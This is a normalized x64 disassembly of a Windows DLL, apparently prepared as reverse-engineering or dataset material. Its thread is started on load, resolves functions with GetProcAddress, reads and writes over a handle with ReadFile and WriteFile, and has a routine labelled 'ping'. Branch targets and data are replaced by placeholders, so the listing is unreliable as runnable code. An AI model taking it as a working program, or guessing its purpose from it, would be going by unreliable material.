sub_180001010
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_1800185c4
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180018b3c
sub_180001050
sub rsp 0x38
cmp edx 0x1
jne r-xdata
mov eax 0x1
add rsp 0x38
retn
xor eax eax
mov [ rw-data ] rcx
lea r8 [ sub_1800010b0 ]
mov [ rsp + 0x28 ] rax
xor r9d r9d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] eax
call [ CreateThread@IAT ]
test rax rax
je r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rax
add rsp 0x38
jmp [ CloseHandle@IAT ]
sub_1800010b0
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x1c8 ]
sub rsp 0x2a0
mov [ rbp - 0x48 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x190 ] rax
mov ecx 0x38
call sub_180018a08
mov rbx rax
mov [ rsp + 0x68 ] rax
xor esi esi
test rax rax
je r-xdata
mov r15 rsi
lea rax [ rbp - 0x70 ]
mov [ rsp + 0x60 ] rax
mov [ rbp - 0x58 ] 0x7
mov [ rbp - 0x60 ] rsi
mov [ rbp - 0x70 ] si
lea r8d [ rsi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x70 ]
call sub_1800023b0
nop
mov [ rbp - 0x28 ] 0x7
mov [ rbp - 0x30 ] rsi
mov [ rbp - 0x40 ] si
lea r8d [ rsi + 0xd ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x40 ]
call sub_1800023b0
nop
lea r8 [ rbp - 0x70 ]
lea rdx [ rbp - 0x40 ]
mov rcx rbx
call sub_1800059e0
mov r15 rax
jmp r-xdata
lea rdx [ r--data ]
mov rcx [ rw-data ]
call [ GetProcAddress@IAT ]
mov rdi rax
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] rsi
mov [ rbp - 0x18 ] si
xor r8d r8d
lea edx [ r8 + 0x32 ]
lea rcx [ rbp - 0x18 ]
call sub_1800027d0
lea rcx [ rbp - 0x18 ]
cmp [ rbp ] 0x8
cmovae rcx [ rbp - 0x18 ]
mov r8d 0x64
lea rdx [ r--data ]
call sub_180018670
mov [ rbp - 0x8 ] 0x32
lea rax [ rbp - 0x18 ]
cmp [ rbp ] 0x8
cmovae rax [ rbp - 0x18 ]
mov [ rax + 0x64 ] si
or r13 0xffffffffffffffff
test rdi rdi
je r-xdata
mov rcx r15
call sub_180005bc0
movzx ebx al
test al al
jne r-xdata
xor bl bl
mov edi 0x1
nop [ rax + rax ] ax
mov eax [ rbp - 0x8 ]
lea ebx [ rax + rax ]
lea rdx [ rbp - 0x18 ]
cmp [ rbp ] 0x8
cmovae rdx [ rbp - 0x18 ]
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x58 ]
mov r8d ebx
mov rcx [ r15 + 0x8 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
lea ecx [ r13 + 0x29 ]
call sub_180018a08
mov rbx rax
test rax rax
je r-xdata
inc edi
cmp edi 0x5
jbe r-xdata
mov ecx 0xbb8
call [ Sleep@IAT ]
cmp [ rbp ] 0x8
jb r-xdata
cmp ebx [ rsp + 0x58 ]
jne r-xdata
mov rbx rsi
mov [ rax + 0x18 ] 0x7
mov [ rax + 0x10 ] rsi
mov [ rax ] si
jmp r-xdata
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] rsi
mov [ rbp - 0x18 ] si
mov rcx [ rbp - 0x18 ]
call j_sub_180018b3c
mov rcx [ r15 + 0x8 ]
call [ FlushFileBuffers@IAT ]
test eax eax
setne al
test al al
je r-xdata
test rbx rbx
je r-xdata
mov r8d 0x2
lea rdx [ r--data ]
lea rcx [ rbp - 0x18 ]
call sub_180002150
mov r9 r13
xor r8d r8d
mov rdx rbx
lea rcx [ rbp - 0x18 ]
call sub_180002070
mov rcx rbx
call rdi
test al al
je r-xdata
test r15 r15
je r-xdata
xor edx edx
mov rcx [ rw-data ]
call [ FreeLibraryAndExitThread@IAT ]
mov rax [ r15 ]
mov edx 0x1
mov rcx r15
call [ rax ]
mov [ rbp - 0x8 ] rsi
lea rax [ rbp - 0x18 ]
cmp [ rbp ] 0x8
cmovae rax [ rbp - 0x18 ]
mov [ rax ] si
nop [ rax + rax ] ax
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov ebx [ rsp + 0x60 ]
shr rbx 0x1
lea rax [ rbp - 0x18 ]
mov r8 [ rbp - 0x18 ]
mov rcx [ rbp ]
cmp rcx 0x8
cmovae rax r8
lea rdx [ rbp + 0x90 ]
mov rdi [ rbp - 0x8 ]
cmp rdx rax
jb r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
mov rcx rbx
call j_sub_180018b3c
mov rcx [ rbx ]
call j_sub_180018b3c
mov rax r13
sub rax rdi
cmp rax rbx
jbe r-xdata
lea rax [ rbp - 0x18 ]
cmp rcx 0x8
cmovae rax r8
lea rax [ rax + rdi * 2 ]
lea rdx [ rbp + 0x90 ]
cmp rax rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_180016e60
test rbx rbx
je r-xdata
lea rax [ rbp - 0x18 ]
cmp rcx 0x8
cmovae rax r8
lea r13 [ rbp + 0x90 ]
sub r13 rax
sar r13 0x1
cmp rdi r13
jb r-xdata
test r14b r14b
je r-xdata
lea r12 [ rdi + rbx ]
mov rax 0x7ffffffffffffffe
cmp r12 rax
ja r-xdata
lea rcx [ r--data ]
call sub_180016ebc
mov rax rdi
sub rax r13
cmp rax rbx
cmovb rbx rax
or rax 0xffffffffffffffff
sub rax rdi
cmp rax rbx
jbe r-xdata
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x60 ]
mov r8d 0x100
lea rdx [ rbp + 0x90 ]
mov rcx [ r15 + 0x8 ]
call [ ReadFile@IAT ]
test eax eax
setne r14b
test r14b r14b
jne r-xdata
mov r12d 0x7
mov [ rbp + 0x28 ] r12
mov r11 rsi
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x10 ] si
cmp rdi 0xffffffffffffffff
cmova rdi r13
mov rax 0x7ffffffffffffffe
cmp rdi rax
ja r-xdata
lea rcx [ r--data ]
call sub_180016e60
cmp rcx r12
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
test rbx rbx
je r-xdata
lea rcx [ r--data ]
call sub_180016e60
cmp rdi r12
jbe r-xdata
test r12 r12
jne r-xdata
mov r8 rdi
mov rdx r12
lea rcx [ rbp - 0x18 ]
call sub_1800027d0
jmp r-xdata
or r13 0xffffffffffffffff
lea r12 [ rdi + rbx ]
mov rax 0x7ffffffffffffffe
cmp r12 rax
ja r-xdata
test rdi rdi
jne r-xdata
xor r8d r8d
mov rdx rdi
lea rcx [ rbp + 0x10 ]
call sub_1800027d0
mov rcx [ rbp ]
mov r8 [ rbp - 0x18 ]
mov r12 [ rbp + 0x28 ]
mov r11 [ rbp + 0x20 ]
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x8 ] rsi
lea rax [ rbp - 0x18 ]
cmp rcx 0x8
cmovae rax r8
mov [ rax ] si
mov r8 [ rbp - 0x18 ]
mov rdi [ rbp - 0x8 ]
mov rcx [ rbp ]
test r12 r12
lea rcx [ r--data ]
call sub_180016e60
cmp rcx r12
jae r-xdata
setne al
test al al
je r-xdata
mov r11 rsi
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x10 ] si
test rdi rdi
lea rax [ rbp - 0x18 ]
cmp rcx 0x8
cmovae rax r8
lea rcx [ rax + rdi * 2 ]
lea r8 [ rbx + rbx ]
lea rdx [ rbp + 0x90 ]
call sub_180018670
mov [ rbp - 0x8 ] r12
lea rax [ rbp - 0x18 ]
cmp [ rbp ] 0x8
cmovae rax [ rbp - 0x18 ]
mov [ rax + r12 * 2 ] si
mov rcx [ rbp ]
mov rdi [ rbp - 0x8 ]
mov r8 [ rbp - 0x18 ]
jmp r-xdata
test r12 r12
jne r-xdata
mov r8 rdi
mov rdx r12
lea rcx [ rbp - 0x18 ]
call sub_1800027d0
jmp r-xdata
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rsi
mov eax 0x20
mov [ rsp + 0x30 ] ax
test r11 r11
je r-xdata
lea rdx [ rbp - 0x18 ]
cmp rcx 0x8
cmovae rdx r8
lea rcx [ rbp + 0x10 ]
cmp r12 0x8
cmovae rcx [ rbp + 0x10 ]
lea rbx [ rdi + rdi ]
mov r8 rbx
call sub_180018670
mov [ rbp + 0x20 ] rdi
lea rax [ rbp + 0x10 ]
cmp [ rbp + 0x28 ] 0x8
cmovae rax [ rbp + 0x10 ]
mov [ rbx + rax ] si
mov r12 [ rbp + 0x28 ]
mov r11 [ rbp + 0x20 ]
setne al
test al al
je r-xdata
mov [ rbp - 0x8 ] rsi
lea rax [ rbp - 0x18 ]
cmp rcx 0x8
cmovae rax r8
mov [ rax ] si
mov r8 [ rbp - 0x18 ]
mov rdi [ rbp - 0x8 ]
mov rcx [ rbp ]
test r12 r12
mov rdi [ rbp + 0x10 ]
mov r9 r11
cmp r11 0x1
jb r-xdata
lea rdx [ rbp - 0x18 ]
cmp rcx 0x8
cmovae rdx r8
lea rax [ rbp - 0x18 ]
cmovae rax r8
lea rcx [ rax + rdi * 2 ]
lea r8 [ rbx + rbx ]
lea rdx [ rdx + r13 * 2 ]
call sub_180018670
mov [ rbp - 0x8 ] r12
lea rax [ rbp - 0x18 ]
cmp [ rbp ] 0x8
cmovae rax [ rbp - 0x18 ]
mov [ rax + r12 * 2 ] si
mov rcx [ rbp ]
mov rdi [ rbp - 0x8 ]
mov r8 [ rbp - 0x18 ]
jmp r-xdata
mov r8d 0xa
lea rdx [ r--data ]
lea rcx [ rbp - 0x18 ]
call sub_1800023b0
mov r9 r13
xor r8d r8d
lea rdx [ rbp + 0x10 ]
lea rcx [ rbp - 0x18 ]
call sub_180002070
mov r8d 0x10
lea rdx [ r--data ]
lea rcx [ rbp - 0x18 ]
call sub_180002150
lea rdx [ rsp + 0x38 ]
mov rcx r15
call rax
test al al
je r-xdata
lea r10 [ rbp + 0x10 ]
mov rdi [ rbp + 0x10 ]
cmp r12 0x8
cmovae r10 rdi
nop [ rax + rax ] ax
cmp [ rbp + 0x50 ] 0x10
jb r-xdata
cmp ebx [ rsp + 0x68 ]
jne r-xdata
cmp [ rbp + 0x50 ] 0x10
jb r-xdata
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rbp - 0x18 ]
call sub_1800023b0
jmp r-xdata
lea rax [ rbp + 0x10 ]
cmp r12 0x8
cmovae rax rdi
lea r8 [ rax + r11 * 2 ]
lea rdx [ rbp + 0x10 ]
cmovae rdx rdi
mov [ rbp + 0x50 ] 0xf
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x38 ] 0x0
lea rcx [ rbp + 0x38 ]
call sub_180002d60
nop
lea rdx [ rbp + 0x38 ]
cmp [ rbp + 0x50 ] 0x10
cmovae rdx [ rbp + 0x38 ]
mov rcx [ rw-data ]
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
cmp [ rbx ] 0x20
je r-xdata
mov [ rbp + 0x50 ] 0xf
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x38 ] 0x0
lea rcx [ rsp + 0x38 ]
call sub_180002330
nop
jmp r-xdata
mov rcx [ rbp + 0x38 ]
call j_sub_180018b3c
mov rcx [ r15 + 0x8 ]
call [ FlushFileBuffers@IAT ]
test eax eax
setne al
test al al
je r-xdata
mov [ rbp + 0x50 ] 0xf
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x38 ] 0x0
lea rcx [ rsp + 0x38 ]
call sub_180002330
nop
mov rcx [ rbp + 0x38 ]
call j_sub_180018b3c
mov eax [ rbp - 0x8 ]
lea ebx [ rax + rax ]
lea rdx [ rbp - 0x18 ]
cmp [ rbp ] 0x8
cmovae rdx [ rbp - 0x18 ]
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x68 ]
mov r8d ebx
mov rcx [ r15 + 0x8 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
test rbx rbx
je r-xdata
add rbx 0x2
dec rax
jmp r-xdata
cmp [ rbp + 0x28 ] 0x8
jb r-xdata
cmp [ rbp + 0x50 ] 0x10
jb r-xdata
mov [ rbp + 0x28 ] 0x7
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x10 ] si
jmp r-xdata
mov rcx [ rbp + 0x10 ]
call j_sub_180018b3c
mov ecx 0x1
lea rdx [ rsp + 0x30 ]
mov r8 rbx
je r-xdata
mov [ rbp + 0x50 ] 0xf
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x38 ] 0x0
mov rbx [ rsp + 0x38 ]
test rbx rbx
je r-xdata
mov rcx [ rbp + 0x38 ]
call j_sub_180018b3c
mov ecx 0x1
cmp [ r8 ] ax
cmovb ecx r13d
test ecx ecx
je r-xdata
add r8 0x2
add rdx 0x2
dec rcx
je r-xdata
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rsi
cmp [ rbp + 0x28 ] 0x8
jb r-xdata
mov rdi [ rsp + 0x40 ]
cmp rbx rdi
je r-xdata
lea rax [ rbp + 0x10 ]
cmp r12 0x8
cmovae rax rdi
sub rbx rax
sar rbx 0x1
cmp rbx 0xffffffffffffffff
je r-xdata
mov rcx rbx
sub rcx r10
sar rcx 0x1
mov rax r13
sub rax rcx
add r9 rax
lea r10 [ rbx + 0x2 ]
jmp r-xdata
jmp r-xdata
mov [ rbp + 0x28 ] 0x7
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x10 ] si
jmp r-xdata
mov rcx [ rbp + 0x10 ]
call j_sub_180018b3c
mov rcx rbx
call j_sub_180018b3c
nop [ rax ] eax
lea r8 [ rbx + 0x1 ]
mov r9 r13
lea rdx [ rbp + 0x60 ]
lea rcx [ rbp + 0x10 ]
call sub_180001f80
nop
mov rdx rax
lea rcx [ rsp + 0x70 ]
call sub_180003ac0
mov r13 rax
lea rax [ rsp + 0x38 ]
cmp rax r13
je r-xdata
mov rax r9
mov rbx r10
test r9 r9
movzx eax [ rdx ]
cmp [ r8 ] ax
jne r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_180018b3c
mov rdi [ rsp + 0x70 ]
test rdi rdi
je r-xdata
mov rdi [ rsp + 0x38 ]
test rdi rdi
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x38 ]
mov [ rsp + 0x70 ] rsi
mov [ rsp + 0x78 ] rsi
mov [ rbp - 0x80 ] rsi
cmp [ rbp + 0x78 ] 0x8
jb r-xdata
mov r12 [ rsp + 0x78 ]
cmp rdi r12
je r-xdata
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rsi
mov rax [ r13 ]
mov [ rsp + 0x38 ] rax
mov rax [ r13 + 0x8 ]
mov [ rsp + 0x40 ] rax
mov rax [ r13 + 0x10 ]
mov [ rsp + 0x48 ] rax
mov [ r13 ] rsi
mov [ r13 + 0x8 ] rsi
mov [ r13 + 0x10 ] rsi
mov r12 [ rsp + 0x40 ]
cmp rdi r12
je r-xdata
mov r9 rbx
xor r8d r8d
lea rdx [ rbp + 0x60 ]
lea rcx [ rbp + 0x10 ]
call sub_180001f80
nop
mov rdx rax
lea rcx [ rbp + 0x10 ]
call sub_180001fd0
nop
cmp [ rbp + 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x60 ]
call j_sub_180018b3c
mov rcx rdi
call j_sub_180018b3c
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx rdi
call j_sub_180018b3c
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
or r13 0xffffffffffffffff
mov r11 [ rbp + 0x20 ]
mov r12 [ rbp + 0x28 ]
mov rcx [ rbp + 0x60 ]
call j_sub_180018b3c
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rsi
mov [ rdi ] si
add rdi 0x28
cmp rdi r12
jne r-xdata
mov rcx [ rdi ]
call j_sub_180018b3c
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rsi
mov [ rdi ] si
add rdi 0x28
cmp rdi r12
jne r-xdata
mov rcx [ rdi ]
call j_sub_180018b3c
mov rdi [ rsp + 0x70 ]
mov rdi [ rsp + 0x38 ]
sub_180001b10
mov r11 rsp
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x70
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ r11 + 0x18 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x68 ] rax
mov rbx rdx
mov rbp rcx
mov [ r11 - 0x60 ] rdx
mov r13d 0x7
mov [ r11 - 0x40 ] r13
xor r12d r12d
mov [ r11 - 0x58 ] r12w
movzx eax [ r--data ]
mov [ rsp + 0x40 ] ax
mov [ r11 - 0x48 ] 0x1
lea rax [ r11 - 0x58 ]
cmp r13 0x8
cmovae rax [ r11 - 0x58 ]
mov [ rax + 0x2 ] r12w
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ r11 - 0x58 ]
call sub_180002070
xor dil dil
mov eax [ rsp + 0x50 ]
lea esi [ rax + rax ]
lea rdx [ rsp + 0x40 ]
cmp [ rsp + 0x58 ] 0x8
cmovae rdx [ rsp + 0x40 ]
mov [ rsp + 0x20 ] r12
lea r9 [ rsp + 0x38 ]
mov r8d esi
mov rcx [ rbp + 0x8 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x58 ] 0x8
jb r-xdata
cmp esi [ rsp + 0x38 ]
jne r-xdata
mov [ rsp + 0x58 ] r13
mov [ rsp + 0x50 ] r12
mov [ rsp + 0x40 ] r12w
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x40 ]
call j_sub_180018b3c
mov rcx [ rbp + 0x8 ]
call [ FlushFileBuffers@IAT ]
test eax eax
setne dil
mov [ rbx + 0x18 ] r13
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
movzx eax dil
mov rcx [ rsp + 0x68 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0xb0 ]
add rsp 0x70
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbx ]
call j_sub_180018b3c
ping
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x10 ] rax
xor r15d r15d
mov r13 rdx
mov r14 rcx
lea rdx [ r--data ]
lea rcx [ rbp - 0x60 ]
lea r8d [ r15 + 0x4 ]
mov [ rbp - 0x48 ] 0x7
mov [ rbp - 0x50 ] r15
mov [ rbp - 0x60 ] r15w
call sub_1800023b0
lea rdx [ rbp - 0x60 ]
mov rcx r14
call sub_180001b10
mov rbx [ r13 ]
movzx edi al
test dil dil
je r-xdata
or rsi 0xffffffffffffffff
test dil dil
je r-xdata
movzx eax dil
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0xd0 ]
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
lea rdx [ r--data ]
lea rcx [ rbp - 0x60 ]
mov r8d 0x1
mov [ rbp - 0x48 ] 0x7
mov [ rbp - 0x50 ] r15
mov [ rbp - 0x60 ] r15w
call sub_1800023b0
lea rdx [ rbp - 0x60 ]
mov rcx r14
call sub_180001b10
movzx edi al
lea edx [ rsi + 0xd ]
lea rcx [ rbp - 0x38 ]
xor r8d r8d
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] r15
mov [ rbp - 0x38 ] r15w
call sub_1800027d0
cmp [ rbp - 0x20 ] 0x8
mov rax [ r--data ]
lea r11 [ rbp - 0x38 ]
mov r12 rsi
cmovae r11 [ rbp - 0x38 ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
cmp [ rbp - 0x20 ] 0x8
mov [ rbp - 0x28 ] 0xc
lea rax [ rbp - 0x38 ]
cmovae rax [ rbp - 0x38 ]
mov [ rax + 0x18 ] r15w
mov rax [ rbx + 0x10 ]
cmp rax rsi
cmovb r12 rax
mov rax rsi
mov rsi [ rbp - 0x28 ]
sub rax rsi
cmp rax r12
jbe r-xdata
lea rcx [ r--data ]
call sub_180016e60
test r12 r12
je r-xdata
mov rax 0xffffffffffffffff
cmp rsi 0xffffffffffffffff
lea rcx [ rbp - 0x60 ]
cmova rsi rax
mov [ rbp - 0x48 ] 0x7
mov [ rbp - 0x50 ] r15
mov rdx rsi
mov [ rbp - 0x60 ] r15w
call sub_180002540
test al al
je r-xdata
lea rdi [ rsi + r12 ]
mov rax 0x7ffffffffffffffe
cmp rdi rax
ja r-xdata
lea rdx [ rbp - 0x60 ]
mov rcx r14
call sub_180001b10
cmp [ rbp - 0x20 ] 0x8
movzx edi al
jb r-xdata
cmp [ rbp - 0x20 ] 0x8
lea rdx [ rbp - 0x38 ]
lea rcx [ rbp - 0x60 ]
cmovae rdx [ rbp - 0x38 ]
cmp [ rbp - 0x48 ] 0x8
lea rdi [ rsi + rsi ]
cmovae rcx [ rbp - 0x60 ]
mov r8 rdi
call sub_180018670
cmp [ rbp - 0x48 ] 0x8
lea rax [ rbp - 0x60 ]
cmovae rax [ rbp - 0x60 ]
mov [ rbp - 0x50 ] rsi
mov [ rdi + rax ] r15w
lea rcx [ r--data ]
call sub_180016e60
mov rcx [ rbp - 0x20 ]
cmp rcx rdi
jae r-xdata
add rbx 0x28
jmp r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_180018b3c
test rdi rdi
jne r-xdata
lea rcx [ rbp - 0x38 ]
mov r8 rsi
mov rdx rdi
call sub_1800027d0
mov rcx [ rbp - 0x20 ]
mov rsi [ rbp - 0x28 ]
test rdi rdi
je r-xdata
cmp rbx [ r13 + 0x8 ]
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
lea rax [ rbp - 0x38 ]
cmp rcx 0x8
mov [ rbp - 0x28 ] r15
cmovae rax [ rbp - 0x38 ]
mov [ rax ] r15w
jmp r-xdata
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
mov rsi [ rbp - 0x28 ]
cmp rcx 0x8
lea rax [ rbp - 0x38 ]
lea r8 [ r12 + r12 ]
cmovae rax [ rbp - 0x38 ]
lea rcx [ rax + rsi * 2 ]
call sub_180018670
cmp [ rbp - 0x20 ] 0x8
lea rax [ rbp - 0x38 ]
cmovae rax [ rbp - 0x38 ]
mov [ rbp - 0x28 ] rdi
mov [ rax + rdi * 2 ] r15w
sub_180001f10
push rbx
sub rsp 0x20
cmp [ rcx + 0x18 ] 0x10
mov rbx rcx
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rcx ]
call j_sub_180018b3c
sub_180001f50
push rbx
sub rsp 0x20
cmp [ rcx + 0x18 ] 0x8
mov rbx rcx
jb r-xdata
xor eax eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rax
mov [ rbx ] ax
add rsp 0x20
pop rbx
retn
mov rcx [ rcx ]
call j_sub_180018b3c
sub_180001f80
push rbx
sub rsp 0x20
xor eax eax
mov rbx rdx
mov [ rdx + 0x18 ] 0x7
mov [ rdx + 0x10 ] rax
mov [ rdx ] ax
mov rdx rcx
mov rcx rbx
mov [ rsp + 0x38 ] eax
call sub_180002260
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180001fd0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rcx + 0x18 ] 0x8
mov [ rsp + 0x30 ] rsi
jb r-xdata
xor esi esi
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rcx ]
call j_sub_180018b3c
mov rax [ rdi ]
mov [ rbx ] rax
mov [ rdi ] rsi
mov r8 [ rdi + 0x10 ]
mov rdx rdi
mov rcx rbx
lea r8 [ r8 + r8 + 0x2 ]
call sub_180018670
jmp r-xdata
mov rax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbx + 0x18 ] rax
mov [ rdi + 0x10 ] rsi
mov [ rdi + 0x18 ] 0x7
mov [ rdi ] si
mov rsi [ rsp + 0x30 ]
sub_180002070
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov rax [ rdx + 0x10 ]
mov rsi r9
mov r12 r8
mov rdi rdx
mov rbx rcx
cmp rax r8
jae r-xdata
mov rcx [ rcx + 0x10 ]
sub rax r8
cmp rax r9
cmovb rsi rax
or rax 0xffffffffffffffff
sub rax rcx
cmp rax rsi
ja r-xdata
lea rcx [ r--data ]
call sub_180016ebc
test rsi rsi
je r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
mov [ rsp + 0x30 ] rbp
lea rbp [ rcx + rsi ]
mov rcx rbx
mov rdx rbp
call sub_180002540
test al al
je r-xdata
mov rbp [ rsp + 0x30 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rdi [ rdi ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax [ rbx + 0x10 ]
lea r8 [ rsi + rsi ]
lea rdx [ rdi + r12 * 2 ]
lea rcx [ rcx + rax * 2 ]
call sub_180018670
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rbp
jb r-xdata
xor ecx ecx
mov [ rax + rbp * 2 ] cx
sub_180002150
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi r8
mov rdi rdx
mov rbx rcx
test rdx rdx
je r-xdata
mov rcx [ rbx + 0x10 ]
or rax 0xffffffffffffffff
sub rax rcx
cmp rax r8
ja r-xdata
mov r9 [ rcx + 0x18 ]
cmp r9 0x8
jb r-xdata
test r8 r8
je r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rbp
lea rbp [ rcx + r8 ]
mov rcx rbx
mov rdx rbp
call sub_180002540
test al al
je r-xdata
cmp r9 0x8
jb r-xdata
cmp rdx rax
jb r-xdata
mov rbp [ rsp + 0x30 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax [ rbx + 0x10 ]
lea rcx [ rcx + rax * 2 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
cmp r9 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax [ rbx + 0x10 ]
lea r8 [ rsi + rsi ]
mov rdx rdi
lea rcx [ rcx + rax * 2 ]
call sub_180018670
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rbp
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
xor ecx ecx
mov [ rax + rbp * 2 ] cx
sub rdi rax
mov r9 r8
mov rdx rbx
sar rdi 0x1
mov rcx rbx
mov r8 rdi
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp sub_180002070
sub_180002260
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov rsi [ rdx + 0x10 ]
mov r12 r8
mov rdi rdx
mov rbx rcx
cmp rsi r8
jae r-xdata
sub rsi r8
cmp r9 rsi
cmovb rsi r9
cmp rcx rdx
jne r-xdata
lea rcx [ r--data ]
call sub_180016ebc
mov rdx rsi
call sub_180002540
test al al
je r-xdata
lea rdx [ rsi + r8 ]
or r8 0xffffffffffffffff
call sub_1800024a0
mov r8 r12
xor edx edx
mov rcx rbx
call sub_1800024a0
jmp r-xdata
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
cmp [ rdi + 0x18 ] 0x8
mov [ rsp + 0x30 ] rbp
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
